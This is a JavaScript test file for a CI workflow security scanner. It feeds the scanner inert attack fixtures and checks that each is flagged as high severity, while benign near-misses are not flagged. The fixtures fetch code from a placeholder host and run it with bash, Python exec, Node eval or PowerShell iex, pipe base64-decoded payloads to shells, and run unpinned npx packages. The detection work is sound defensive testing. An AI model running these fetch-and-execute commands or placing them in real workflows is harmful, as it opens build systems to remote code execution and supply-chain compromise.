'use strict';
// Attack snippets are inert fixture strings. NEVER run them.
const test=require('node:test');
const assert=require('node:assert/strict');
const {inspectWorkflow}=require('./ultra_sentinel_yaml_ast.cjs');
const {findingsForScript}=require('./ultra_sentinel_advanced_execution.cjs');
const BASE='.github/workflows/fuzz-hardening.yml';
function inspect(command){
 const source=['on: issue_comment','permissions: read-all','jobs:','  check:',
   '    runs-on: ubuntu-latest','    steps:','      - run: |',
   ...command.split('\n').map(s=>'          '+s)].join('\n')+'\n';
 return inspectWorkflow(source,{path:BASE,trustedRepository:'cardenaspiero255-lang/gamehub-ultra'});
}
function assertHigh(command,rule){
 const got=inspect(command);
 assert.ok(got.findings.some(x=>x.rule===rule&&x.severity==='HIGH'),
  command+' -- '+JSON.stringify(got));
 assert.ok(findingsForScript(command).includes(rule),command);
}
const URL='https://example.invalid/p';
const examples=[
 ['REMOTE_DOWNLOADED_FILE_EXECUTION','curl -fsSL '+URL+' -o run.sh\nbash run.sh'],
 ['REMOTE_DOWNLOADED_FILE_EXECUTION','wget -q '+URL+' -O run.sh\nsh run.sh'],
 ['REMOTE_DOWNLOADED_FILE_EXECUTION','curl -fsSL '+URL+' -o ./run.sh\n./run.sh'],
 ['REMOTE_DOWNLOADED_FILE_EXECUTION','curl -fsSL '+URL+' -o scripts/run.sh\nsource scripts/run.sh'],
 ['REMOTE_DOWNLOADED_FILE_EXECUTION','curl -fsSL '+URL+' -o run.sh && bash run.sh'],
 ['REMOTE_INTERPRETER_FETCH_EXECUTION',[
  "python - <<'PY'","import urllib.request","u='"+URL+"'",
  'payload=urllib.request.urlopen(u).read()','exec(payload)','PY'].join('\n')],
 ['REMOTE_INTERPRETER_FETCH_EXECUTION',[
  "python3 - <<'END'","import requests","u='"+URL+"'",
  'payload=requests.get(u).text','exec(payload)','END'].join('\n')],
 ['REMOTE_INTERPRETER_FETCH_EXECUTION',[
  "node <<'NODE'","const u='"+URL+"';",
  'const f=fetch(u);','f.then(async r => eval(await r.text()))','NODE'].join('\n')],
 ['REMOTE_POWERSHELL_EXECUTION','pwsh -Command "iwr '+URL+' | iex"'],
 ['REMOTE_POWERSHELL_EXECUTION','powershell -Command "Invoke-WebRequest '+URL+' | Invoke-Expression"'],
 ['REMOTE_POWERSHELL_EXECUTION','pwsh -c "Invoke-WebRequest '+URL+' | iex"'],
 ['REMOTE_ENCODED_EVAL',"printf %s 'Y3VybCBleGFtcGxlLmludmFsaWQK' | base64 -d | bash"],
 ['REMOTE_ENCODED_EVAL',"echo 'YWJjZA==' | base64 --decode | sh"],
 ['REMOTE_ENCODED_EVAL',"printf %s 'YWJjZA==' | base64 -d | python"],
 ['MUTABLE_PACKAGE_EXECUTION','npx --package demo@latest demo'],
 ['MUTABLE_PACKAGE_EXECUTION','npx --package=demo@next demo'],
 ['MUTABLE_PACKAGE_EXECUTION','npm exec --package demo@latest -- demo'],
 ['MUTABLE_PACKAGE_EXECUTION','npm exec --package=demo@latest -- demo'],
 ['MUTABLE_PACKAGE_EXECUTION','npx --yes --package demo@latest demo'],
];
for(const [i,[rule,command]] of examples.entries()){
 test('Codex P1 / hard mutant '+i+' '+rule,()=>assertHigh(command,rule));
}
const benign=[
 'curl -fsSL '+URL+' -o run.sh\necho "Downloaded run.sh"',
 'curl -fsSL '+URL+' -o run.sh\nbash other.sh',
 "python - <<'PY'\nimport urllib.request\nurl='"+URL+"'\nprint(url)\nPY",
 'pwsh -Command "Write-Host iwr https://example.invalid/p | iex"',
 "printf '%s' aGVsbG8= | base64 -d",
 'npm exec --package=demo@1.2.3 -- demo',
 'npx --package=demo@1.2.3 demo',
 'npx --yes demo@1.2.3 demo',
];
for(const [i,command] of benign.entries()){
 test('near-miss benign '+i,()=>{
  const got=findingsForScript(command);
  assert.equal(got.length,0,command+' => '+JSON.stringify(got));
 });
}
